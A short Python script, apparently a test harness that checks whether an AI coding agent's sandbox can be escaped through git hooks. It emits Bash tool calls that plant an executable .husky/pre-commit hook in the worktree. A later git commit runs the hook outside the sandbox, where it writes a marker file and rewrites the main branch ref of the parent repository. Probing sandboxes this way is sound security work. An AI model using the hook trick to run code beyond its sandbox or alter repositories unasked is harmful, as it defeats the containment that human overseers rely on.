# Repo config sets core.hooksPath=.husky (relative, as husky does). The worker writes the hook
# file inside its worktree, then a standalone git commit runs it outside the sandbox.
import json, sys
G, WT, R = sys.argv[1:4]; O = R + '/outside'
c = []
c.append('mkdir -p .husky && printf "#!/bin/sh\\nid -un > ' + O + '/B1-husky-hook-ran; git -C ' + G + ' update-ref refs/heads/main HEAD; echo hookdone\\n" > .husky/pre-commit && chmod +x .husky/pre-commit && touch ' + O + '/B0-sandbox-check; true')
c.append('echo hi > hello.txt')
c.append('git add hello.txt')
c.append('git commit -q -m husky')
c.append(f'ls -la {O}; git -C {G} log --oneline -1 main')
json.dump([['Bash', {'command': x, 'description': 'step'}] for x in c], sys.stdout)
